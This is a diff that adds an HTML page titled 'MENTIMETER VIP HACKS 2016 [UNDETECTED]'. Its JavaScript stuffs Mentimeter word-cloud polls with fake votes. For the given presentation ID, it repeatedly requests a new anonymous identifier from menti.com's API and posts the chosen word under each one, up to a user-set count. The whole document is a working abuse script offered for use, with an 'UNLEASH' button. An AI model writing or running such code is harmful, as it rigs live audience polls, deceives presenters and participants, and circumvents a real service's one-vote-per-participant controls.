@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MENTIMETER VIP HACKS 2016 [UNDETECTED]</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script>
+  function hack() {
+    var error = false;
+    var presentation = document.getElementById("presentation").value;
+    if (presentation == null || presentation == "") {
+      document.getElementById("presentation").className = "error";
+      error = true;
+    }
+    else {
+      document.getElementById("presentation").className = "";
+    }
+    var word = document.getElementById("word").value;
+    if (word == null || word == "") {
+      document.getElementById("word").className = "error";
+      error = true;
+    }
+    else {
+      document.getElementById("word").className = "";
+    }
+    var count = document.getElementById("count").value;
+    if (count == null || count == "" || count == 0) {
+      document.getElementById("count").className = "error";
+      error = true;
+    }
+    else {
+      document.getElementById("count").className = "";
+    }
+    if (error) {
+      document.getElementById("output").innerHTML = "Input error";
+      return;
+    }
+
+    document.getElementById("progress").value = 0;
+    document.getElementById("progress").max = 2 * count + 1;
+    document.getElementById("output").innerHTML = "";
+
+    var question;
+    $.ajax({
+      type: "GET",
+      beforeSend: function(request) { request.setRequestHeader("origin", "https://www.menti.com"); },
+      url: "https://www.menti.com/api/objects/vote_ids/" + presentation,
+      async: false,
+      complete: function(request, status) {
+        if (status != "success") {
+          error = true;
+          document.getElementById("output").innerHTML += "Question ID " + status + "\n";
+          return;
+        }
+        question = JSON.parse(request.responseText).pace.active;
+        document.getElementById("output").innerHTML += "Question ID " + status + ": " + question + "\n";
+        document.getElementById("progress").value++;
+      }
+    });
+    if (error) return;
+
+    var json = JSON.parse('{"question":"","question_type":"","vote":""}');
+    json.question = question;
+    json.question_type = "wordcloud";
+    json.vote = word;
+
+    for (var i = 0; i < count; i++) {
+      var user;
+      $.ajax({
+        type: "POST",
+        beforeSend: function(request) { request.setRequestHeader("origin", "https://www.menti.com"); },
+        url: "https://www.menti.com/api/identifier",
+        async: true,
+        complete: function(request, status) {
+          user = JSON.parse(request.responseText).identifier;
+          document.getElementById("output").innerHTML += "User ID " + status + ": " + user + "\n";
+          document.getElementById("progress").value++;
+          if (status != "success") return;
+          $.ajax({
+            type:"POST",
+            beforeSend: function(request) {
+              request.setRequestHeader("x-identifier", user);
+            },
+            url: "https://www.menti.com/api/vote",
+            async: true,
+            data: JSON.stringify(json),
+            processData: true,
+            contentType: "application/json",
+            complete: function(request, status) {
+              document.getElementById("output").innerHTML += "Vote " + status + ": " + JSON.stringify(json) + "\n";
+              document.getElementById("progress").value++;
+            }
+          });
+        }
+      });
+    }
+  }
+
+  function toggleNSFW() {
+    document.getElementById("content").className = (document.getElementById("showNSFW").checked) ? "nsfw" : "";
+  }
+  </script>
+  <style>
+  .error {
+    background: #f99;
+  }
+
+  .nsfw, .nsfw * {
+    background: #000;
+    font-family: monospace;
+    color: #0f0;
+  }
+  .nsfw input,
+  .nsfw textarea,
+  .nsfw button,
+  .nsfw progress {
+    border: 1px solid #0f0;
+  }
+  .nsfw input[type=number] {
+    appearance: textfield;
+    -moz-appearance: textfield;
+  }
+  .nsfw input::-webkit-outer-spin-button,
+  .nsfw input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+  }
+  .nsfw .error {
+    background: #f00;
+  }
+  </style>
+</head>
+<body id="content">
+  <table>
+    <tr><td></td><td><input type="checkbox" id="showNSFW" onclick="toggleNSFW()" />IT'S A UNIX SYSTEM</td></tr>
+    <tr><td>ID</td><td style=><input type="text" id="presentation" style="width:100%" /></td></tr>
+    <tr><td>Vote</td><td><input type="text" id="word" style="width:100%" /></td></tr>
+    <tr><td>Count</td><td><input type="number" id="count" value="10" style="width:100%" /></td></tr>
+    <tr><td><button onclick="hack()">UNLEASH</button></td><td><progress id="progress" value="0" max="10" style="width:100%"></progress></td></tr>
+  </table>
+
+  <div style="width:100%"><textarea id="output" rows="20" style="font-family:monospace;width:inherit" readonly></textarea></div>
+</body>
+</html>
